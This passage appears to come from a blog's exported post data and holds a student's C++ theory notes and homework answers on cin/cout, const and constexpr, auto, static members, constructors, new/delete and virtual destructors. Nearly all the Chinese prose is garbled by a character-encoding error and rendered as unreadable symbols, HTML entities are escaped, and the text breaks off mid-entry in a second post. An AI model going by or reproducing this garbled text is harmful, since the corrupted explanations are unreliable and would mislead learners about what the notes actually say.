//cin.ignore(a,ch)æ–¹æ³•æ˜¯ä»è¾“å…¥æµï¼ˆcinï¼‰ä¸­æå–å­—ç¬¦ï¼Œæå–çš„å­—ç¬¦è¢«å¿½ç•¥ï¼ˆignoreï¼‰ï¼Œä¸è¢«ä½¿ç”¨; //è¿™ä¸¤ä¸ªå‡½æ•°æ­é…ä½¿ç”¨å¯ä»¥å°†ç¼“å­˜åŒºçš„æ•°æ®æå–å‡ºæ¥å¹¶ä¸¢å¼ƒï¼› ç¬¬ä¸€å‘¨T17ï¼š #include\u0026lt;iostream\u0026gt; using namespace std; int main(){ int cout; cin\u0026gt;\u0026gt;cout; cout\u0026lt;\u0026lt;cout; } //æ— è¾“å‡º,ç¼–è¯‘è¿è¡Œæ­£å¸¸ï¼Œæ”¹ä¸ºï¼š //std::cout\u0026lt;\u0026lt;cout; //å°±å¯ä»¥è¾“å‡º 1 ç¬¬ä¸€å‘¨T19ï¼š std::cout\u0026lt;\u0026lt;(cout\u0026lt;\u0026lt;cout); //è¾“å…¥ï¼š è¾“å‡ºï¼š //1 2 0001 - 0010 //2 4 0010 - 10 00 //3 24 0011 - 11 000 //4 64 0100 - 100 0000 //5 160 0101 - 0101 00000 std::cout\u0026lt;\u0026lt;cout\u0026lt;\u0026lt;cout; //1 11 //2 22 //5 55 thisæŒ‡é’ˆ constä¸constexpr # ç¬¬äºŒå‘¨ T2\n1.æˆå‘˜å‡½æ•°å£°æ˜ä¸ºconstï¼Œå°±ç›¸å½“äºthisæŒ‡é’ˆè®¾ä¸ºäº†constï¼Œä»è€Œè¾¾åˆ°æ— æ³•ä¿®æ”¹å¯¹è±¡çš„ä½œç”¨\n2.é™æ€æˆå‘˜å‡½æ•°æ²¡æœ‰thisæŒ‡é’ˆï¼Œåœ¨æ²¡æœ‰åˆ›å»ºä»»ä½•å¯¹è±¡æ—¶ä¹Ÿèƒ½è°ƒç”¨é™æ€æˆå‘˜å‡½æ•°\n3.å‹å…ƒå‡½æ•°å†…æ²¡æœ‰thisæŒ‡é’ˆï¼Ÿ\n1.å¼•ç”¨å°±æ˜¯æŸä¸€å˜é‡ï¼ˆç›®æ ‡ï¼‰çš„ä¸€ä¸ªåˆ«åï¼Œå¯¹å¼•ç”¨çš„æ“ä½œä¸å¯¹å˜é‡ç›´æ¥æ“ä½œå®Œå…¨ä¸€æ ·(æ­£ç¡®) 2. #include\u0026lt;iostream\u0026gt; using namespace std; int main() { int a=1; int *b = \u0026amp;a; int **c = \u0026amp;b; int ***d = \u0026amp;c; int ****e = \u0026amp;d; int *****f = \u0026amp;e; cout\u0026lt;\u0026lt; f \u0026lt;\u0026lt; endl \u0026lt;\u0026lt; e \u0026lt;\u0026lt; endl \u0026lt;\u0026lt; d \u0026lt;\u0026lt; endl \u0026lt;\u0026lt; c \u0026lt;\u0026lt; endl\u0026lt;\u0026lt; b; } //è¾“å‡ºï¼š 0x61fdf0 0x61fdf8 0x61fe00 0x61fe08 0x61fe14 3. constexpr æ˜¯ C++11 æ ‡å‡†æ–°æ·»åŠ çš„å…³é”®å­—ï¼Œå¹¶å»ºè®®å°† const å’Œ constexpr çš„åŠŸèƒ½åŒºåˆ†å¼€ï¼Œå³å‡¡æ˜¯è¡¨è¾¾â€œåªè¯»â€è¯­ä¹‰çš„åœºæ™¯éƒ½ä½¿ç”¨ constexprï¼Œè¡¨è¾¾â€œå¸¸é‡â€è¯­ä¹‰çš„åœºæ™¯éƒ½ä½¿ç”¨ const (é”™è¯¯) åº”è¯¥æ˜¯ï¼š C++ 11æ ‡å‡†ä¸­ï¼Œä¸ºäº†è§£å†³ const å…³é”®å­—çš„åŒé‡è¯­ä¹‰é—®é¢˜ï¼Œä¿ç•™äº† const è¡¨ç¤ºâ€œåªè¯»â€çš„è¯­ä¹‰ï¼Œè€Œå°†â€œå¸¸é‡â€çš„è¯­ä¹‰åˆ’åˆ†ç»™äº†æ–°æ·»åŠ çš„ constexpr å…³é”®å­—ã€‚ å› æ­¤ C++11 æ ‡å‡†ä¸­ï¼Œå»ºè®®å°† const å’Œ constexpr çš„åŠŸèƒ½åŒºåˆ†å¼€ï¼Œå³å‡¡æ˜¯è¡¨è¾¾â€œåªè¯»â€è¯­ä¹‰çš„åœºæ™¯éƒ½ä½¿ç”¨ constï¼Œè¡¨è¾¾â€œå¸¸é‡â€è¯­ä¹‰çš„åœºæ™¯éƒ½ä½¿ç”¨ constexprã€‚ const è¡¨ç¤ºâ€œåªè¯»â€çš„è¯­ä¹‰ï¼Œä¸€èˆ¬ä¸æ›´æ”¹ constexpr è¡¨ç¤ºâ€œå¸¸é‡â€ 4. W2 T11ï¼š void dis_1(const int x){ array \u0026lt;int,x\u0026gt; myarr{1,2,3,4,5}; cout \u0026lt;\u0026lt; myarr[1] \u0026lt;\u0026lt; endl; } void dis_2(){ const int x = 5; array \u0026lt;int,x\u0026gt; myarr{1,2,3,4,5}; cout \u0026lt;\u0026lt; myarr[1] \u0026lt;\u0026lt; endl; } int main() { dis_1(5); dis_2(); } dis_1()è¿è¡Œå‡ºé”™ï¼Œdis_2()èƒ½å¤Ÿæ­£å¸¸è¿è¡Œ 5.å…³äºè¯­å¥(1)å’Œè¯­å¥(2)ï¼Œè¯´æ³•æ­£ç¡®çš„æ˜¯ï¼š ï¼ˆ1ï¼‰const int a = 5 + 4; ï¼ˆ2ï¼‰constexpr int a = 5 + 4; (1)å’Œ(2)å‡æ­£ç¡® auto # æ€»è¿°ï¼š autoçš„åŸç†å°±æ˜¯æ ¹æ®åé¢çš„å€¼ï¼Œæ¥è‡ªå·±æ¨æµ‹å‰é¢çš„ç±»å‹æ˜¯ä»€ä¹ˆã€‚\nautoçš„ä½œç”¨å°±æ˜¯ä¸ºäº†ç®€åŒ–å˜é‡åˆå§‹åŒ–ï¼Œå¦‚æœè¿™ä¸ªå˜é‡æœ‰ä¸€ä¸ªå¾ˆé•¿å¾ˆé•¿çš„åˆå§‹åŒ–ç±»å‹ï¼Œå°±å¯ä»¥ç”¨autoä»£æ›¿ã€‚\næ³¨æ„ç‚¹ï¼š 1.ç”¨autoå£°æ˜çš„å˜é‡å¿…é¡»åˆå§‹åŒ–ï¼ˆautoæ˜¯æ ¹æ®åé¢çš„å€¼æ¥æ¨æµ‹è¿™ä¸ªå˜é‡çš„ç±»å‹ï¼Œå¦‚æœåé¢æ²¡æœ‰å€¼ï¼Œè‡ªç„¶ä¼šæŠ¥é”™ï¼‰\n2.å‡½æ•°å’Œæ¨¡æ¿å‚æ•°ä¸èƒ½è¢«å£°æ˜ä¸ºautoï¼ˆåŸå› åŒä¸Šï¼‰\n3.å› ä¸ºautoæ˜¯ä¸€ä¸ªå ä½ç¬¦ï¼Œå¹¶ä¸æ˜¯ä¸€ä¸ªä»–è‡ªå·±çš„ç±»å‹ï¼Œå› æ­¤ä¸èƒ½ç”¨äºç±»å‹è½¬æ¢æˆ–å…¶ä»–ä¸€äº›æ“ä½œï¼Œå¦‚sizeofå’Œtypeid\n4.å®šä¹‰åœ¨ä¸€ä¸ªautoåºåˆ—çš„å˜é‡å¿…é¡»å§‹ç»ˆæ¨å¯¼æˆåŒä¸€ç±»å‹\nauto x1 = 5, x2 = 5.0, x3=\u0026#39;r\u0026#39;; // This is too much....we cannot combine like this ç¤ºä¾‹ï¼š std::vector\u0026lt;std::string\u0026gt; ve; std::vector\u0026lt;std::string\u0026gt;::iterator it = ve.begin(); æˆ‘ä»¬å¯ä»¥ç”¨atuoæ¥ä»£æ›¿é‚£ä¸ªåˆå§‹åŒ–ç±»å‹ï¼š auto it = ve.begin(); æ­¤å¤–ï¼Œå¦‚æœæ˜¯å¯ç”¨è¿­ä»£å™¨çš„å¯¹è±¡çš„è¯ï¼Œè¿˜å¯ä»¥è¿™æ ·æ“ä½œï¼š int main() { vector\u0026lt;int\u0026gt;v; v.push_back(1); v.push_back(2); v.push_back(3); for(auto i : v){ cout\u0026lt;\u0026lt;i\u0026lt;\u0026lt;\u0026#34; \u0026#34;; } cout\u0026lt;\u0026lt;endl; return 0; } autoåœ¨è¿™é‡Œå°±æ˜¯ç®€å•çš„æ›¿æ¢äº†intç±»å‹ã€‚ W2 T16 ä¸‹åˆ—å…³äºautoçš„è¯´æ³•é”™è¯¯çš„æ˜¯ï¼š A.ä½¿ç”¨autoå£°æ˜çš„å˜é‡å¿…é¡»åˆå§‹åŒ– B.å‡½æ•°å’Œæ¨¡æ¿å‚æ•°ä¸èƒ½è¢«å£°æ˜ä¸ºauto C.å› ä¸ºautoæ˜¯ä¸€ä¸ªå ä½ç¬¦ï¼Œå¹¶ä¸æ˜¯ä¸€ä¸ªä»–è‡ªå·±çš„ç±»å‹ï¼Œå› æ­¤ä¸èƒ½ç”¨äºç±»å‹è½¬æ¢æˆ–å…¶ä»–ä¸€äº›æ“ä½œï¼Œå¦‚sizeofå’Œtypeid D.å®šä¹‰åœ¨ä¸€ä¸ªautoåºåˆ—çš„å˜é‡ä¸å¿…å§‹ç»ˆæ¨å¯¼æˆåŒä¸€ç±»å‹ (D) c++ç‰¹æ€§ # 1.C/C++é¢å‘å¯¹è±¡å¼€å‘çš„å››å¤§ç‰¹æ€§ï¼šå°è£…ã€æŠ½è±¡ã€ç»§æ‰¿ã€å¤šæ€\n2.åœ¨ç¨‹åºè®¾è®¡ä¸­ï¼Œå¯¹äºè¢«æŠ½è±¡çš„æ•°æ®ï¼Œç§°ä¸ºæŠ½è±¡æ•°æ®ç±»å‹ï¼ˆAbstract Data Type, ADTï¼‰\n3.ç±»å®šä¹‰åå¿…é¡»è·Ÿç€ä¸€ä¸ªåˆ†å·æˆ–ä¸€ä¸ªå£°æ˜åˆ—è¡¨ã€‚\n4.ç±»å£°æ˜é‡Œé¢publicå’Œprivateå¯ä»¥ä»¥ä»»æ„é¡ºåºå¤šæ¬¡å‡ºç°\n5.C++ä¸­åŒç±»çš„ä¸åŒå¯¹è±¡å¯ä»¥ç›¸äº’è®¿é—®æˆå‘˜(åŒ…æ‹¬ç§æœ‰æˆå‘˜)\nï¼ˆæ¯”å¦‚åœ¨æ‹·è´å¤åˆ¶æ„é€ å‡½æ•°ä¸­ï¼‰\nå¼•ç”¨ # constå¸¸å¼•ç”¨\nint x = 0; int \u0026amp;a = x; a += 10; const int \u0026amp;b = xï¼› //bå¯ä»¥å¼•ç”¨aï¼Œä½†æ˜¯båªèƒ½è¯»å–xçš„å€¼ä¸èƒ½é€šè¿‡bå»æ”¹å˜xçš„å€¼ã€‚ static # ç±»ä¸­é™æ€(static)æˆå‘˜ä¸èƒ½åœ¨ç±»çš„å®šä¹‰å†…åˆå§‹åŒ–ï¼Œè¦åœ¨ç±»å¤–å†å†™ç±»å‹ ç±»å::å˜é‡å = a æ¥åˆå§‹åŒ–å®šä¹‰\nint class::static_count = 1; é™æ€æˆå‘˜å‡½æ•° æ²¡æœ‰ thisæŒ‡é’ˆ\nçœ‹åˆ°static int a;å°±è¦æ‰¾ä¸€ä¸‹çœ‹çœ‹æœ‰æ²¡æœ‰åœ¨ç±»ä¹‹å¤–åˆå§‹åŒ–\nåœ¨C++ä¸­ï¼Œé™æ€æˆå‘˜å‡½æ•°çš„ä¸»è¦ç›®çš„æ˜¯è®¿é—®é™æ€æˆå‘˜ã€‚getTotal()ã€getPoints() å½“ç„¶ä¹Ÿå¯ä»¥å£°æ˜ä¸ºæ™®é€šæˆå‘˜å‡½æ•°ï¼Œä½†æ˜¯å®ƒä»¬éƒ½åªå¯¹é™æ€æˆå‘˜è¿›è¡Œæ“ä½œï¼ŒåŠ ä¸Š static è¯­ä¹‰æ›´åŠ æ˜ç¡®ã€‚ å’Œé™æ€æˆå‘˜å˜é‡ç±»ä¼¼ï¼Œé™æ€æˆå‘˜å‡½æ•°åœ¨å£°æ˜æ—¶è¦åŠ  staticï¼Œåœ¨å®šä¹‰æ—¶ä¸èƒ½åŠ  staticã€‚é™æ€æˆå‘˜å‡½æ•°å¯ä»¥é€šè¿‡ç±»æ¥è°ƒç”¨ï¼ˆä¸€èˆ¬éƒ½æ˜¯è¿™æ ·åšï¼‰ï¼Œä¹Ÿå¯ä»¥é€šè¿‡å¯¹è±¡æ¥è°ƒç”¨ a1.value_of_a(); A::value_of_a(); //åªèƒ½å¯¹é™æ€æˆå‘˜å˜é‡è¿›è¡Œæ“ä½œï¼Œä¸èƒ½ä½¿ç”¨éé™æ€æˆå‘˜å˜é‡ æ„é€ å‡½æ•° # 1.åœ¨å†™äº†ä¸€ä¸ªæœ‰ä¼ å‚çš„æ„é€ å‡½æ•°åï¼Œç³»ç»Ÿå°±ä¸ä¼šç”Ÿæˆé»˜è®¤çš„æ— å‚æ„é€ å‡½æ•°äº†\n2.ä¸‹é¢å…³äºæ„é€ å‡½æ•°å’Œæˆå‘˜å¸¸é‡æè¿°æ­£ç¡®çš„æ˜¯\nA.æ„é€ å‡½æ•°å› ä¸ºæ˜¯ç”¨æ¥åˆå§‹åŒ–çš„ï¼Œå› æ­¤åœ¨æ„é€ å‡½æ•°çš„ä»»ä½•å¯¹æˆå‘˜å¸¸é‡çš„èµ‹å€¼éƒ½æ˜¯è¢«å…è®¸çš„\nB.æ„é€ å‡½æ•°è™½ç„¶æ˜¯ç”¨æ¥åˆå§‹åŒ–çš„ï¼Œä½†å¸¸é‡å¿…é¡»åœ¨å£°æ˜çš„æ—¶å€™å°±å®šä¹‰ï¼Œå¦‚const int a=1;\nC.æ„é€ å‡½æ•°ä¹Ÿèƒ½å¯¹æˆå‘˜å¸¸é‡åˆå§‹åŒ–ï¼ˆè¦åœ¨åˆå§‹åŒ–åˆ—è¡¨é‡Œåˆå§‹åŒ–ï¼‰\n**åªæœ‰ï¼ˆcï¼‰æ­£ç¡®\næ„é€ å‡½æ•°ä¸èƒ½å¯¹å·²ç»åˆå§‹åŒ–å®šä¹‰çš„æˆå‘˜å¸¸é‡åˆå§‹åŒ–\n3.\nPointer C = Pointer(2,4);//ç­‰åŒäºPointer Cï¼ˆ2,4ï¼‰ï¼›\nclass Pointer { int row; int col publicï¼š //æ— å‚æ„é€ å‡½æ•° Pointer(){} //è°ƒåŠ¨ç¼ºçœæ„é€ å‡½æ•°æ—¶ï¼Œä¸è¦åŠ æ‹¬å·ï¼Œä¾‹å¦‚ï¼šPointer c1ï¼› //ä¸€æ—¦æ²¡æœ‰å®å‚å´åŠ äº†æ‹¬å·ï¼ŒC++ä¸ºäº†å…¼å®¹äºCï¼Œå°±ä¼šå°†å…¶è¯†åˆ«ä¸ºå‡½æ•°çš„å£°æ˜ //æœ‰å‚æ„é€ å‡½æ•° Pointer(int r,int c) { row = r; col = c; } //è°ƒåŠ¨æœ‰å‚æ„é€ å‡½æ•°æ—¶ï¼Œå¸¦æ‹¬å·å°±å¿…é¡»ä¼ å…¥å®ï¼ï¼ä¾‹å¦‚ï¼šPointer c(1,2)ï¼› //è¿˜å¯ä»¥ä½¿ç”¨å¦‚ä¸‹çš„å†™æ³•ï¼š Pointer C = Pointer(2,4);//ç­‰åŒäºPointer Cï¼ˆ2,4ï¼‰ï¼› é‡‡ç”¨åˆ—è¡¨çš„æ–¹å¼æ¥åˆå§‹åŒ–å¯¹è±¡\nclass Objectï¼š { int value; public: Object(int x = 0):value(x){} //ç­‰åŒäº{value = x;} }; class Rectangle { private: int left; int top; int right; int bottom; public: // ä¸€æ¬¡å®šä¹‰é»˜è®¤æ„é€ å‡½æ•°å’Œå¸¦å‚çš„æ„é€ å‡½æ•° Rectangle(int e = 0, int t = 0, int r = 0, int b = 0) : left(e), top(t), right(r), bottom(b) {} } ç±»ä¸­æˆå‘˜çš„æ„å»ºé¡ºåºï¼ï¼ï¼\næŒ‰ç…§è®¾è®¡çš„é¡ºåºï¼Œå³æˆ‘ä»¬å£°æ˜çš„é¡ºåº çœ‹ä¸‹é¢çš„ä»£ç ï¼š\nclass Object { int num; int sun; public: Object(int x = 0):sum(x),num(sum){} void print() const { cout\u0026lt;\u0026lt;num\u0026lt;\u0026lt;\u0026#34; \u0026#34;\u0026lt;\u0026lt;endl; } }; int main() { Object obj; return 0; } //å³ä¾¿æ„é€ å‡½æ•°ä¹¦å†™çš„åˆ—è¡¨é¡ºåºæ˜¯å…ˆæ„å»ºsumï¼Œå†æ„å»ºnumï¼Œä½†æ˜¯ï¼Œå…¶ä»ä¼šæ ¹æ®å£°æ˜é¡ºåºå…ˆæ„å»ºnumï¼Œç”±äºsumè¿˜æœªè¿›è¡Œæ„å»ºï¼Œå› æ­¤ï¼Œnumçš„å€¼ä¸ºéšæœºå€¼ï¼Œè€Œsumçš„å€¼ä¸º0 4.æ„é€ å‡½æ•°ä¸å¿…æ˜¯publicï¼Œ private çš„æ„é€ å‡½æ•°ä¸èƒ½ä½¿ç”¨ä»¥ä¸‹çš„å®šä¹‰ å‡è®¾Açš„æ„é€ æ˜¯ç§æœ‰çš„ï¼Œ å®šä¹‰ A a;æˆ–è€… A*a = new Aéƒ½æ˜¯é”™çš„ã€‚å› ä¸ºA()ä¸ºç§æœ‰å‡½æ•°ï¼Œå¤–éƒ¨ä¸èƒ½ç›´æ¥æ“ä½œã€‚\nä¸€èˆ¬æ–¹æ³•æ˜¯å¦å¤–å†å®šä¹‰ä¸€ä¸ªpublicçš„å‡½æ•°è‡ªåŠ¨è°ƒç”¨Aï¼ˆï¼‰\nclass A { private: A(); public: static A* GetA() {return new A} } //å¦åˆ™ï¼š #include\u0026lt;iostream\u0026gt; using namespace std; class A{ A(){ cout\u0026lt;\u0026lt;\u0026#34;hello world\u0026#34;\u0026lt;\u0026lt;endl; } }; int main(){ A a; } //å› ä¸ºè°ƒç”¨äº†privateæˆå‘˜å‡½æ•°(å³æ„é€ å‡½æ•°)è€Œç¼–è¯‘é”™è¯¯ è€Œææ„å‡½æ•°å¿…é¡»ç»™æˆå…¬æœ‰çš„ï¼Œå› ä¸ºæœ‰å…­ä¸ªå‡½æ•°ï¼ˆæ„é€ å‡½æ•°ã€ææ„å‡½æ•°ã€æ‹·è´æ„é€ å‡½æ•°ã€èµ‹å€¼å‡½æ•°ã€\u0026amp;ï¼ˆå–åœ°å€ï¼‰è¿ç®—ç¬¦é‡è½½ã€const\u0026amp;ï¼ˆå–åœ°å€ï¼‰è¿ç®—ç¬¦é‡è½½ï¼‰å¦‚æœç”¨æˆ·ä¸æ˜¾ç¤ºç»™å‡ºæ¥ï¼Œç³»ç»Ÿä¼šæ ¹æ®æƒ…å†µè‡ªåŠ¨åˆæˆã€‚ å½“ææ„å‡½æ•°æ˜¾ç¤ºç»™å‡ºæ¥åï¼Œç³»ç»Ÿä¾¿ä¸ä¼šåˆæˆï¼Œä½†æ˜¯å½“å¯¹è±¡ç”Ÿå‘½å‘¨æœŸç»“æŸåï¼Œç³»ç»Ÿä¾¿è°ƒç”¨ï¼Œæ­¤æ—¶ä¾¿ä¼šå¼•å‘é”™è¯¯ã€‚\n5.é˜…è¯»ï¼š\næ„é€ å‡½æ•°å¿…é¡»æ˜¯publicå—_c++ æ„é€ å‡½æ•°ï¼Œææ„å‡½æ•°å¿…é¡»è¦ç»™æˆå…¬æœ‰çš„å—ï¼Ÿ\nè¿™æ˜¯ä¸€é“é¢è¯•é¢˜ï¼Œè®°å¾—å½“æ—¶å›ç­”çš„å¹¶ä¸å¥½ï¼Œå› ä¸ºæˆ‘ä»¬å¯¹æ„é€ å‡½æ•°ç»å¸¸ä½¿ç”¨ï¼Œä¾‹å¦‚å•ä¾‹æ¨¡å¼ä¸‹æ„é€ å‡½æ•°æˆ‘ä»¬ä¼šå£°æ˜ä¸ºç§æœ‰çš„ï¼Œå…¶ä»–æƒ…å†µä¸‹æ„é€ å‡½æ•°æˆ‘ä»¬éƒ½ä¼šå£°æ˜ä¸ºå…¬æœ‰çš„ï¼Œä½†æ˜¯ææ„å‡½æ•°æ˜¯å¦å¿…é¡»å£°æ˜ä¸ºå…¬æœ‰çš„ï¼Œè¿˜çœŸæ²¡æ³¨æ„ã€‚ä¸‹é¢æˆ‘ä»¬å°±ä¸€èµ·å­¦ä¹ ä¸‹ã€‚\n(ä¸€)ä¸€ä¸ªç±»çš„ææ„å‡½æ•°åªèƒ½æœ‰ä¸€ä¸ªï¼Œä¹Ÿä¸èƒ½é‡è½½\n1.ç±»çš„ææ„å‡½æ•°ï¼Œæ˜¯åœ¨å¯¹è±¡çš„ç”Ÿå‘½å‘¨æœŸç»“æŸåï¼Œç”±ç³»ç»Ÿè‡ªåŠ¨è°ƒç”¨çš„ã€‚\n2.è¯¥å‡½æ•°ä¸éœ€ä»»ä½•å‚æ•°ï¼Œä¸éœ€è¦ä¼ å…¥ä»»ä½•å‚æ•°ï¼Œå¦‚æœéè¦å†™ä¸€ä¸ªå¸¦å‚æ•°çš„ææ„å‡½æ•°ï¼Œåˆ™ä¼šé€ æˆç¼–è¯‘å™¨çš„æŠ±æ€¨ï¼Œé€ æˆäºŒä¹‰æ€§ï¼Œè¿™ä¸€ç‚¹å’Œæ„é€ å‡½æ•°ä¸åŒï¼Œæ„é€ å‡½æ•°å¯ä»¥æ ¹æ®ä¼ å…¥çš„å‚æ•°ï¼Œé€‰æ‹©åˆé€‚çš„æ„é€ å‡½æ•°ã€‚æ„é€ å‡½æ•°å¯ä»¥æ˜¾ç¤ºè°ƒç”¨ï¼Œè€Œææ„å‡½æ•°ç³»ç»Ÿè´Ÿè´£è°ƒç”¨ï¼Œç¨‹åºæ— æ³•æ§åˆ¶å…¶è°ƒç”¨æ—¶æœºã€‚\n(äºŒ)æ„é€ å‡½æ•°ï¼Œææ„å‡½æ•°å¿…é¡»æ˜¯å…¬æœ‰çš„å—ï¼Ÿ\n1.ææ„å‡½æ•°å¿…é¡»ç»™æˆå…¬æœ‰çš„ï¼Œå› ä¸ºå¯¹è±¡ç”Ÿå‘½å‘¨æœŸç»“æŸåï¼Œç³»ç»Ÿä¼šè°ƒç”¨ï¼Œå¦‚æœä¸æ˜¯å…¬æœ‰çš„åˆ™ä¼šå¼•å‘é”™è¯¯\n2.æ„é€ å‡½æ•°å¯ä»¥æ˜¯å…¬æœ‰çš„ï¼Œç§æœ‰çš„ï¼Œä¿æŠ¤çš„ â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€” ç‰ˆæƒå£°æ˜ï¼šæœ¬æ–‡ä¸ºCSDNåšä¸»ã€Œweixin_39530557ã€çš„åŸåˆ›æ–‡ç« ï¼Œéµå¾ªCC 4.0 BY-SAç‰ˆæƒåè®®ï¼Œè½¬è½½è¯·é™„ä¸ŠåŸæ–‡å‡ºå¤„é“¾æ¥åŠæœ¬å£°æ˜ã€‚ åŸæ–‡é“¾æ¥ï¼šhttps://blog.csdn.net/weixin_39530557/article/details/111339796\nnewä¸delete # ä¸€ã€newå’Œmallocçš„åŒºåˆ« 1.éƒ½åœ¨å †åŒºå¼€è¾Ÿç©ºé—´ï¼Œè‹¥å †åŒºç©ºé—´ä¸è¶³å¤±è´¥ï¼Œmallocè¿”å›ä¸€ä¸ªç©ºæŒ‡é’ˆï¼ŒnewæŠ›å‡ºå¼‚å¸¸throw bad_alloc 2.mallocæ˜¯Cåº“å‡½æ•°ï¼Œåªæ˜¯å¼€è¾Ÿç©ºé—´ï¼Œä½†æ— å¯¹è±¡ï¼Œåªæœ‰ä¸€ä¸ªåŠ¨ä½œï¼Œå¿…é¡»é€šè¿‡å®šä½newæ¥æ„å»ºå¯¹è±¡ã€‚ 3.newæ˜¯æ ‡è¯†ç¬¦ï¼Œå…³é”®å­—ï¼Œè¿ç®—ç¬¦ï¼ˆå¯ä»¥é‡å†™ï¼‰ç”³è¯·å¼€è¾Ÿç©ºé—´ï¼Œè°ƒåŠ¨æ„é€ å‡½æ•°æ„å»ºå¯¹è±¡ï¼Œä¸¤ä¸ªåŠ¨ä½œã€‚ 4.newä¼šè‡ªåŠ¨è®¡ç®—å¯¹è±¡çš„å¤§å°\n5.newæ˜¯ä¿ç•™å­—,ä¸éœ€è¦å¤´æ–‡ä»¶æ”¯æŒ.\nmallocéœ€è¦å¤´æ–‡ä»¶åº“å‡½æ•°æ”¯æŒ.\näºŒã€freeå’Œdelete\n1.freeé‡Šæ”¾ç©ºé—´\n2.deleteè°ƒåŠ¨æŒ‡é’ˆæŒ‡å‘çš„å¯¹è±¡çš„ææ„å‡½æ•°é‡Šæ”¾èµ„æºï¼Œç„¶åç³»ç»Ÿé‡Šæ”¾ç©ºé—´ï¼Œæ³¨é”€å¯¹è±¡(åŠ¨æ€)\n3.åŠ¨æ€åˆ›å»ºçš„å¯¹è±¡ï¼Œä¸æ˜¾å¼deleteä¸ä¼šè‡ªåŠ¨è°ƒç”¨ææ„å‡½æ•°\nä¸‰ã€newçš„ä¸‰ç§è°ƒåŠ¨å½¢å¼\n1.è¿ç®—ç¬¦ç”¨æ³•ï¼ˆå…³é”®å­—è°ƒåŠ¨ï¼‰ å¼€è¾Ÿç©ºé—´ï¼Œè°ƒåŠ¨æ„é€ å‡½æ•°æ„å»ºå¯¹è±¡\nObject *op = new Object(10); //Object *op = NULL; //op = new Object(10); 2.å‡½æ•°ç”¨æ³•ï¼ˆå‡½æ•°è°ƒåŠ¨ï¼‰\nå’Œmallocå¾ˆåƒï¼Œæ­¤æ—¶ä¸ä¼šè°ƒåŠ¨æ„é€ å‡½æ•°ï¼Œåªç”³è¯·ç©ºé—´ï¼Œ ä½†åŒºåˆ«æ˜¯ï¼šæ­¤æ—¶ç”³è¯·å¤±è´¥ä»ç„¶æŠ›å‡ºå¼‚å¸¸throw bad_alloc\nObject *os = (Object*)::operator new(sizeof(Object)); 3.å®šä½new\nnew(æœ‰æ•ˆåœ°å€ç©ºé—´) å¹¶ä¸å¼€è¾Ÿç©ºé—´ï¼Œè°ƒåŠ¨æ„é€ å‡½æ•°,oså·²ç»ç”³è¯·åˆ°ç©ºé—´ï¼Œåœ¨osæŒ‡å®šçš„ç©ºé—´ä¸­åˆ›å»ºå¯¹è±¡ new(os) Object(100); os-\u0026gt;~Object(); å®šä½newå¯ä»¥å®Œæˆå¯¹è±¡çš„äºŒæ¬¡æ„å»º new(\u0026amp;a) Object(10000); //a.Object(10000); newç”³è¯·ä¸€ä¸ªå¯¹è±¡å’Œä¸€ç»„å¯¹è±¡çš„è¯­æ³•åŒºåˆ«ï¼ˆï¼‰[ ] Object obja(20);//.stackâ€”â€”\u0026gt;å‡½æ•°å¼€å§‹è°ƒåŠ¨æ„å»ºï¼Œå‡½æ•°ç»“æŸè°ƒåŠ¨ææ„ Object objb[10];//.stackâ€”â€”\u0026gt;è°ƒåŠ¨10æ¬¡æ„å»ºï¼Œå‡½æ•°ç»“æŸè°ƒåŠ¨10æ¬¡ææ„ Object *s = new Object(n);//.heap Object *p = new Object[n];//.heap delete s; delete []p;//ç¼–è¯‘å™¨ä¼šè‡ªåŠ¨è®¡ç®—å‡ºé”€æ¯å¤šå°‘ä¸ªå¯¹è±¡ï¼ˆå·²ç»è®°å½•åœ¨æ¡ˆï¼‰ çº¯è™šå‡½æ•° # æ„é€ å‡½æ•°ä¸èƒ½æ˜¯è™šå‡½æ•° # è€Œä¸”ï¼Œåœ¨æ„é€ å‡½æ•°ä¸­è°ƒç”¨è™šå‡½æ•°ï¼Œå®é™…æ‰§è¡Œçš„æ˜¯çˆ¶ç±»çš„å¯¹åº”å‡½æ•°ï¼Œå› ä¸ºè‡ªå·±è¿˜æ²¡æœ‰æ„é€ å¥½, å¤šæ€æ˜¯è¢«disableçš„ã€‚\nææ„å‡½æ•°å¯ä»¥æ˜¯è™šå‡½æ•° # çº¯è™šå‡½æ•°é€šå¸¸æ²¡æœ‰å®šä¹‰ä½“ï¼Œä½†ä¹Ÿå®Œå…¨å¯ä»¥æ‹¥æœ‰, ç”šè‡³å¯ä»¥æ˜¾ç¤ºè°ƒç”¨ã€‚\nææ„å‡½æ•°å¯ä»¥æ˜¯çº¯è™šçš„ï¼Œä½†çº¯è™šææ„å‡½æ•°å¿…é¡»æœ‰å®šä¹‰ä½“ï¼Œå› ä¸ºææ„å‡½æ•°çš„è°ƒç”¨æ˜¯åœ¨å­ç±»ä¸­éšå«çš„ã€‚\nclass Base { public: Base(){} virtual ~Base() = 0; //pure virtual }; Base::~Base()//function body { } éçº¯çš„è™šå‡½æ•°å¿…é¡»æœ‰å®šä¹‰ä½“ï¼Œä¸ç„¶æ˜¯ä¸€ä¸ªé”™è¯¯\nè™šå‡½æ•°æ˜¯åŠ¨æ€ç»‘å®šçš„ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œä½¿ç”¨è™šå‡½æ•°çš„æŒ‡é’ˆå’Œå¼•ç”¨èƒ½å¤Ÿæ­£ç¡®æ‰¾åˆ°å®é™…ç±»çš„å¯¹åº”å‡½æ•°ï¼Œè€Œä¸æ˜¯æ‰§è¡Œå®šä¹‰ç±»çš„å‡½æ•°ã€‚è¿™æ˜¯è™šå‡½æ•°çš„åŸºæœ¬åŠŸèƒ½ï¼Œå°±ä¸å†è§£é‡Šäº†ã€‚\n","date":"June 30, 2023","permalink":"/posts/c++/homework/c++%E7%90%86%E8%AE%BA1/","section":"Posts","summary":"cinä¸cout # ç¬¬ä¸€å‘¨T8ï¼ŒT9ï¼ŒT10 ä¸‹é¢è¯­å¥çš„è¾“å‡ºæ˜¯ï¼Ÿ","title":"C++ç†è®º1"},{"content":" æ„é€ å‡½æ•° # 1.æ„é€ å‡½æ•°1çš„å‚æ•°åˆ—è¡¨\n//ä»¥ä¸‹ä¸¤ä¸ªæ„é€ å‡½æ•°éƒ½æ˜¯æ²¡æœ‰å‚æ•°æ—¶è°ƒç”¨çš„æ„é€ å‡½æ•°ï¼Œä¼šå¯¼è‡´ç¼–è¯‘é”™è¯¯ï¼ï¼ï¼ class first { Foo() { x = 1; y = 1; } 